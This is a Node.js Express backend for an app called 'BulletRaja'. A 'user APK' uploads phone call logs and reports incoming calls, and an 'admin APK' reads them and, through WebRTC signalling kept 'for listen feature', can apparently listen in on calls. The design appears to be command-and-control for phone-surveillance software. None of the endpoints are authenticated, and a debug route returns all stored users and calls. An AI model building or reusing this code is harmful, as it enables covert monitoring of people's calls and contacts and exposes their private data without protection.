const express = require("express");
const { MongoClient } = require("mongodb");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json());

const MONGODB_URI = process.env.MONGODB_URI;
let cachedDb = null;

async function connectDB() {
  if (cachedDb) return cachedDb;
  const client = new MongoClient(MONGODB_URI);
  await client.connect();
  cachedDb = client.db("bulletraja");
  return cachedDb;
}

// ── Health check ──────────────────────────────────────────────
app.get("/", (req, res) => {
  res.json({ status: "BulletRaja API running" });
});

// ── USERS ─────────────────────────────────────────────────────

// Register user (user APK calls this on first launch)
app.post("/api/users", async (req, res) => {
  try {
    const db = await connectDB();
    const { deviceId, name, role } = req.body;
    if (!deviceId || !name) {
      return res.status(400).json({ success: false, error: "Missing fields" });
    }
    await db.collection("users").updateOne(
      { deviceId },
      {
        $set: {
          deviceId,
          name,
          role: role || "user",
          isOnline: true,
          lastSeen: new Date(),
          registeredAt: new Date(),
        },
      },
      { upsert: true }
    );
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, error: "Server error" });
  }
});

// Get ALL users (admin APK calls this)
app.get("/api/users", async (req, res) => {
  try {
    const db = await connectDB();
    const users = await db
      .collection("users")
      .find({})
      .sort({ lastSeen: -1 })
      .toArray();
    res.json(users);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: "Server error" });
  }
});

// Heartbeat — keeps user online
app.patch("/api/users/heartbeat", async (req, res) => {
  try {
    const db = await connectDB();
    const { deviceId } = req.body;
    await db.collection("users").updateOne(
      { deviceId },
      { $set: { isOnline: true, lastSeen: new Date() } }
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: "Server error" });
  }
});

// Mark offline
app.patch("/api/users/offline", async (req, res) => {
  try {
    const db = await connectDB();
    const { deviceId } = req.body;
    await db.collection("users").updateOne(
      { deviceId },
      { $set: { isOnline: false, lastSeen: new Date() } }
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: "Server error" });
  }
});

// ── CALL LOGS ─────────────────────────────────────────────────

// Upload call logs (user APK syncs here)
app.post("/api/calllogs", async (req, res) => {
  try {
    const db = await connectDB();
    const { deviceId, logs } = req.body;
    if (!deviceId || !logs || !Array.isArray(logs)) {
      return res.status(400).json({ success: false, error: "Missing fields" });
    }
    if (logs.length === 0) return res.json({ success: true, count: 0 });

    const ops = logs.map((log) => ({
      updateOne: {
        filter: { deviceId, timestamp: log.timestamp, number: log.number },
        update: { $set: { deviceId, ...log, syncedAt: new Date() } },
        upsert: true,
      },
    }));

    await db.collection("calllogs").bulkWrite(ops);
    res.json({ success: true, count: logs.length });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, error: "Server error" });
  }
});

// Get call logs for a user (admin APK reads this)
app.get("/api/calllogs/:deviceId", async (req, res) => {
  try {
    const db = await connectDB();
    const { deviceId } = req.params;
    const logs = await db
      .collection("calllogs")
      .find({ deviceId })
      .sort({ timestamp: -1 })
      .limit(200)
      .toArray();
    res.json(logs);
  } catch (err) {
    res.status(500).json({ error: "Server error" });
  }
});

// ── INCOMING CALLS ────────────────────────────────────────────

// User phone is ringing — notify backend
app.post("/api/call/incoming", async (req, res) => {
  try {
    const db = await connectDB();
    const { deviceId, phoneNumber, callerName, timestamp } = req.body;
    if (!deviceId) {
      return res.status(400).json({ error: "Missing deviceId" });
    }
    // Remove any stale ringing for this device first
    await db
      .collection("incomingcalls")
      .deleteMany({ deviceId, status: "ringing" });

    await db.collection("incomingcalls").insertOne({
      deviceId,
      phoneNumber: phoneNumber || "Unknown",
      callerName: callerName || "",
      status: "ringing",
      timestamp: timestamp ? new Date(timestamp) : new Date(),
      createdAt: new Date(),
    });
    console.log(`📱 RINGING: ${deviceId} ← ${phoneNumber}`);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: "Server error" });
  }
});

// Call ended
app.post("/api/call/ended", async (req, res) => {
  try {
    const db = await connectDB();
    const { deviceId, phoneNumber } = req.body;
    await db.collection("incomingcalls").updateMany(
      { deviceId, status: "ringing" },
      { $set: { status: "ended", endedAt: new Date() } }
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: "Server error" });
  }
});

// Get all currently ringing calls (admin polls this)
app.get("/api/call/incoming/active", async (req, res) => {
  try {
    const db = await connectDB();
    // Auto-expire calls older than 60 seconds
    await db.collection("incomingcalls").updateMany(
      {
        status: "ringing",
        createdAt: { $lt: new Date(Date.now() - 60000) },
      },
      { $set: { status: "ended" } }
    );
    const calls = await db
      .collection("incomingcalls")
      .find({ status: "ringing" })
      .sort({ createdAt: -1 })
      .toArray();
    res.json(calls);
  } catch (err) {
    res.status(500).json({ error: "Server error" });
  }
});

// ── LEGACY WebRTC (kept for listen feature) ───────────────────

app.post("/api/call/start", async (req, res) => {
  try {
    const db = await connectDB();
    const { callId, callerId, callerName } = req.body;
    await db.collection("calls").insertOne({
      callId, callerId, callerName,
      status: "active", createdAt: new Date(),
    });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: "Server error" });
  }
});

app.post("/api/call/offer", async (req, res) => {
  try {
    const db = await connectDB();
    const { callId, offer } = req.body;
    await db.collection("calls").updateOne({ callId }, { $set: { offer } });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: "Server error" });
  }
});

app.post("/api/call/answer", async (req, res) => {
  try {
    const db = await connectDB();
    const { callId, answer } = req.body;
    await db.collection("calls").updateOne({ callId }, { $set: { answer } });
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: "Server error" });
  }
});

app.post("/api/call/candidate", async (req, res) => {
  try {
    const db = await connectDB();
    const { callId, candidate, role } = req.body;
    const field =
      role === "caller" ? "callerCandidates"
      : role === "receiver" ? "receiverCandidates"
      : "adminCandidates";
    await db.collection("calls").updateOne(
      { callId },
      { $push: { [field]: candidate } }
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: "Server error" });
  }
});

app.get("/api/call/data", async (req, res) => {
  try {
    const db = await connectDB();
    const { callId } = req.query;
    const call = await db.collection("calls").findOne({ callId });
    res.json(call || {});
  } catch (err) {
    res.status(500).json({ error: "Server error" });
  }
});

app.patch("/api/call/end", async (req, res) => {
  try {
    const db = await connectDB();
    const { callId } = req.body;
    await db.collection("calls").updateOne(
      { callId },
      { $set: { status: "ended", endedAt: new Date() } }
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: "Server error" });
  }
});

app.patch("/api/users/status", async (req, res) => {
  try {
    const db = await connectDB();
    const { deviceId, isOnCall, currentCallId } = req.body;
    await db.collection("users").updateOne(
      { deviceId },
      { $set: { isOnCall, currentCallId, lastSeen: new Date() } }
    );
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: "Server error" });
  }
});

// ── DEBUG — check what's in DB ────────────────────────────────
app.get("/api/debug", async (req, res) => {
  try {
    const db = await connectDB();
    const users = await db.collection("users").find({}).toArray();
    const logs = await db.collection("calllogs").countDocuments();
    const calls = await db.collection("incomingcalls").find({}).toArray();
    res.json({ users, callLogCount: logs, incomingCalls: calls });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

module.exports = app;
